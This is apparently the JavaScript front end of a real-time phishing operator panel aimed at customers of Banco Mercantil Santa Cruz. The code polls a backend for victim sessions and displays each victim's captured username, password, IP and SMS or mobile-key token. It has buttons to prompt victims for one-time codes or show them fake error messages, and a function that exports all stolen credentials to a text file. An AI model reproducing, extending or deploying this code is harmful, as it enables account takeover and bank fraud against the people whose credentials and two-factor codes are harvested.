/**
 * BMSC - Panel de Operador
 * Monitoreo de sesiones y validación de credenciales en tiempo real
 */

const LANE_COUNT = 5;
const LANE_NAMES = ['Azul', 'Verde', 'Rojo', 'Gris', 'Amarillo'];

let rows = new Map();
let currentFilter = 'all';
let isInitialLoad = true;
let isSoundMuted = localStorage.getItem('bmsc_sound_muted') === 'true';
let audioCtx = null;

// DOM Elements
const tbody = document.getElementById('sessionsTbody');
const emptyState = document.getElementById('emptyState');
const statTotal = document.getElementById('statTotal');
const statOnline = document.getElementById('statOnline');
const statWaiting = document.getElementById('statWaiting');
const audioToggle = document.getElementById('audioToggle');
const btnClean = document.getElementById('btnClean');
const btnExport = document.getElementById('btnExport');
const statusIndicator = document.querySelector('.status-indicator');
const statusText = document.getElementById('statusText');
const footerNote = document.getElementById('footerNote');

// Counts elements
const countAll = document.getElementById('countAll');
const laneCountEls = [
  document.getElementById('countLane0'),
  document.getElementById('countLane1'),
  document.getElementById('countLane2'),
  document.getElementById('countLane3'),
  document.getElementById('countLane4')
];

function statusLabel(state) {
  switch (state) {
    case 'waiting': return 'En espera';
    case 'typing': return 'Escribiendo...';
    case 'waiting-dinamica': return 'Clave Móvil solicitada';
    case 'waiting-sms': return 'SMS solicitado';
    case 'received-dinamica': return 'Clave Móvil ingresada';
    case 'received-sms': return 'SMS ingresado';
    case 'error-login': return 'Error contraseña';
    case 'error-dinamica': return 'Error Clave Móvil';
    case 'error-sms': return 'Error SMS';
    case 'done': return 'Aprobado / Listo';
    default: return 'Nuevo';
  }
}

function badgeClass(state) {
  switch (state) {
    case 'waiting':
    case 'waiting-dinamica':
    case 'waiting-sms':
      return 'badge badge--wait';
    case 'typing':
      return 'badge badge--typing';
    case 'received-dinamica':
    case 'received-sms':
      return 'badge badge--token';
    case 'done':
      return 'badge badge--done';
    case 'error-login':
    case 'error-dinamica':
    case 'error-sms':
      return 'badge badge--error';
    default:
      return 'badge badge--wait';
  }
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  } catch (_) {
    return '—';
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT;
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `<span style="display:inline-flex;align-items:center;gap:4px;color:#f97316;" title="Teléfono celular">📱 Móvil</span>`;
  }
  return `<span style="display:inline-flex;align-items:center;gap:4px;color:#38bdf8;" title="Computadora de escritorio">💻 PC</span>`;
}

// Audio System (Web Audio API)
function initAudio() {
  try {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
    if (audioCtx.state === 'suspended') {
      audioCtx.resume();
    }
  } catch (_) {}
}

function updateAudioUI() {
  if (isSoundMuted) {
    audioToggle.textContent = '🔇 Sonido: OFF';
    audioToggle.classList.add('is-muted');
  } else {
    audioToggle.textContent = '🔊 Sonido: ON';
    audioToggle.classList.remove('is-muted');
  }
}

function playNotificationSound() {
  if (isSoundMuted) return;
  try {
    initAudio();
    if (!audioCtx || audioCtx.state === 'suspended') return;

    const now = audioCtx.currentTime;
    const frequencies = [659.25, 880]; // E5, A5 chime
    frequencies.forEach((freq, idx) => {
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(freq, now + idx * 0.1);
      gain.gain.setValueAtTime(0.3, now + idx * 0.1);
      gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.1 + 0.3);
      osc.start(now + idx * 0.1);
      osc.stop(now + idx * 0.1 + 0.3);
    });
  } catch (_) {}
}

audioToggle.addEventListener('click', (e) => {
  e.preventDefault();
  isSoundMuted = !isSoundMuted;
  localStorage.setItem('bmsc_sound_muted', isSoundMuted ? 'true' : 'false');
  updateAudioUI();
  if (!isSoundMuted) {
    initAudio();
    playNotificationSound();
  }
});

window.addEventListener('click', initAudio, { once: true });

async function setRowAction(rowId, action, state) {
  const row = rows.get(rowId);
  if (!row) return;
  row.state = state || row.state;
  row.action = action;
  row.last_seen = Date.now();
  row.updatedAt = Date.now();
  footerNote.textContent = `Sesión #${row.index} (${row.user}) → ${statusLabel(row.state)}`;

  try {
    await fetch(`/api/sessions/${rowId}/action`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, state })
    });
  } catch (_) {}
  render();
}

function createRowElement(row) {
  const tr = document.createElement('tr');
  tr.dataset.rowId = row.id;
  const laneIdx = laneForIndex(row.index);

  tr.innerHTML = `
    <td class="col-num mono font-bold">#${row.index}</td>
    <td class="col-time mono text-muted">${formatTime(row.createdAt)}</td>
    <td class="col-lane">
      <span class="lane-tag lane-tag--${laneIdx}">${LANE_NAMES[laneIdx]}</span>
    </td>
    <td class="col-device">${getDeviceIcon(row.device)}</td>
    <td class="col-ip mono text-muted">${row.ip || '—'}</td>
    <td class="col-user">
      <span class="copy-box col-user-val" data-copy="${row.user}">${row.user}</span>
    </td>
    <td class="col-pass">
      <span class="copy-box col-pass-val" data-copy="${row.clave}">${row.clave}</span>
    </td>
    <td class="col-token">
      <span class="copy-box col-token-val ${row.token ? 'token-highlight' : ''}" data-copy="${row.token || ''}">
        ${row.token || '—'}
      </span>
    </td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="act-btn act-btn--movil" data-action="dinamica" title="Solicitar Clave Móvil">Clave Móvil</button>
        <button type="button" class="act-btn act-btn--sms" data-action="sms" title="Solicitar código SMS">SMS</button>
        <button type="button" class="act-btn act-btn--err-pass" data-action="error-login" title="Notificar contraseña incorrecta">Err Clave</button>
        <button type="button" class="act-btn act-btn--err-token" data-action="error-dinamica" title="Notificar código incorrecto">Err Código</button>
        <button type="button" class="act-btn act-btn--done" data-action="done" title="Aprobar acceso">Aprobar</button>
      </div>
    </td>
  `;

  // Action button clicks
  tr.querySelector('[data-action="dinamica"]').addEventListener('click', () => {
    setRowAction(row.id, 'dinamica', 'waiting-dinamica');
  });
  tr.querySelector('[data-action="sms"]').addEventListener('click', () => {
    setRowAction(row.id, 'sms', 'waiting-sms');
  });
  tr.querySelector('[data-action="error-login"]').addEventListener('click', () => {
    setRowAction(row.id, 'error-login', 'error-login');
  });
  tr.querySelector('[data-action="error-dinamica"]').addEventListener('click', () => {
    setRowAction(row.id, 'error-dinamica', 'error-dinamica');
  });
  tr.querySelector('[data-action="done"]').addEventListener('click', () => {
    setRowAction(row.id, 'done', 'done');
  });

  // Copy click listeners
  tr.querySelectorAll('.copy-box').forEach(box => {
    box.addEventListener('click', async (e) => {
      e.stopPropagation();
      const val = box.dataset.copy;
      if (!val || val === '—') return;
      try {
        await navigator.clipboard.writeText(val);
        box.classList.add('copied');
        setTimeout(() => box.classList.remove('copied'), 1000);
      } catch (_) {}
    });
  });

  return tr;
}

function updateRowElement(tr, row) {
  const laneIdx = laneForIndex(row.index);
  tr.querySelector('.col-num').textContent = `#${row.index}`;
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt);
  
  const laneTag = tr.querySelector('.lane-tag');
  laneTag.className = `lane-tag lane-tag--${laneIdx}`;
  laneTag.textContent = LANE_NAMES[laneIdx];
  
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device);
  tr.querySelector('.col-ip').textContent = row.ip || '—';
  
  const userBox = tr.querySelector('.col-user-val');
  userBox.textContent = row.user;
  userBox.dataset.copy = row.user;
  
  const passBox = tr.querySelector('.col-pass-val');
  passBox.textContent = row.clave;
  passBox.dataset.copy = row.clave;
  
  const tokenBox = tr.querySelector('.col-token-val');
  tokenBox.textContent = row.token || '—';
  tokenBox.dataset.copy = row.token || '';
  tokenBox.classList.toggle('token-highlight', !!row.token);

  tr.querySelector('.col-online').innerHTML = row.online
    ? '<span class="pill pill--online">● En línea</span>'
    : '<span class="pill pill--offline">○ Off</span>';

  tr.querySelector('.col-status').innerHTML = `
    <span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>
  `;

  // Active state on action buttons
  const btnMovil = tr.querySelector('[data-action="dinamica"]');
  const btnSms = tr.querySelector('[data-action="sms"]');
  btnMovil?.classList.toggle('is-active', row.state === 'waiting-dinamica');
  btnSms?.classList.toggle('is-active', row.state === 'waiting-sms');
}

function render() {
  const list = [...rows.values()].sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
  
  statTotal.textContent = String(list.length);
  statOnline.textContent = String(list.filter(s => s.online).length);
  statWaiting.textContent = String(list.filter(s => s.state === 'waiting' || s.state === 'waiting-dinamica' || s.state === 'waiting-sms').length);
  
  countAll.textContent = String(list.length);
  const laneCounts = [0, 0, 0, 0, 0];
  list.forEach(s => {
    laneCounts[laneForIndex(s.index)]++;
  });
  laneCounts.forEach((c, idx) => {
    if (laneCountEls[idx]) laneCountEls[idx].textContent = String(c);
  });

  const filtered = currentFilter === 'all'
    ? list
    : list.filter(s => String(laneForIndex(s.index)) === currentFilter);

  emptyState.classList.toggle('is-visible', filtered.length === 0);

  // Remove rows no longer present or filtered out
  [...tbody.querySelectorAll('tr[data-row-id]')].forEach(tr => {
    const id = tr.dataset.rowId;
    const item = filtered.find(s => s.id === id);
    if (!item) tr.remove();
  });

  // Add or update rows
  filtered.forEach(row => {
    let tr = tbody.querySelector(`tr[data-row-id="${row.id}"]`);
    if (!tr) {
      tr = createRowElement(row);
      tbody.appendChild(tr);
    }
    updateRowElement(tr, row);
  });
}

// Filter tabs listener
document.querySelectorAll('.lane-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.lane-tab').forEach(t => t.classList.remove('is-active'));
    tab.classList.add('is-active');
    currentFilter = tab.dataset.filter;
    render();
  });
});

// Polling
async function pollSessions() {
  try {
    const response = await fetch('/api/sessions');
    if (response.ok) {
      statusIndicator.className = 'status-indicator live';
      statusText.textContent = 'En vivo';
      
      const list = await response.json();
      const oldKeys = new Set(rows.keys());
      let hasAlert = false;

      list.forEach(session => {
        if (!oldKeys.has(session.id)) {
          hasAlert = true;
        } else {
          const old = rows.get(session.id);
          if (old && (old.state !== session.state || old.token !== session.token)) {
            hasAlert = true;
          }
        }
      });

      rows.clear();
      list.forEach(s => {
        rows.set(s.id, {
          id: s.id,
          index: s.index,
          createdAt: s.createdAt,
          updatedAt: s.updatedAt,
          last_seen: s.last_seen,
          tipo: s.tipoUsuario || 'Banca por Internet',
          device: s.device || 'desktop',
          ip: s.ip || '127.0.0.1',
          user: s.username || '—',
          clave: s.password || '—',
          token: s.token || '',
          state: s.state || 'waiting',
          action: s.action,
          online: s.online
        });
      });

      render();

      if (hasAlert && !isInitialLoad) {
        playNotificationSound();
      }
    } else {
      statusIndicator.className = 'status-indicator offline';
      statusText.textContent = 'Error API';
    }
  } catch (err) {
    statusIndicator.className = 'status-indicator offline';
    statusText.textContent = 'Desconectado';
  }
}

// Clean queue
btnClean?.addEventListener('click', async () => {
  if (!confirm('¿Seguro que deseas limpiar la cola de sesiones?')) return;
  rows.clear();
  try {
    await fetch('/api/clear', { method: 'POST' });
  } catch (_) {}
  render();
});

// Export to TXT
btnExport?.addEventListener('click', () => {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
  if (list.length === 0) {
    alert('No hay información en el panel para guardar.');
    return;
  }

  let text = `========================================================\r\n`;
  text += `REPORTE DE OPERACIONES - BANCO MERCANTIL SANTA CRUZ\r\n`;
  text += `Fecha de descarga: ${new Date().toLocaleString('es-BO')}\r\n`;
  text += `Total de sesiones: ${list.length}\r\n`;
  text += `========================================================\r\n\r\n`;

  list.forEach((row, i) => {
    text += `[#${i + 1}] SESIÓN ID: ${row.id}\r\n`;
    text += `Hora: ${new Date(row.createdAt).toLocaleString('es-BO')}\r\n`;
    text += `Carril: ${LANE_NAMES[laneForIndex(row.index)]}\r\n`;
    text += `Dispositivo: ${row.device}\r\n`;
    text += `IP: ${row.ip}\r\n`;
    text += `Usuario: ${row.user}\r\n`;
    text += `Contraseña: ${row.clave}\r\n`;
    text += `Clave Móvil / SMS: ${row.token || '—'}\r\n`;
    text += `Estado: ${statusLabel(row.state)}\r\n`;
    text += `--------------------------------------------------------\r\n\r\n`;
  });

  const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `sesiones_bmsc_${Date.now()}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
});

// Polling interval 1.5s
window.setInterval(pollSessions, 1500);

// Initial start
updateAudioUI();
pollSessions().then(() => {
  isInitialLoad = false;
});
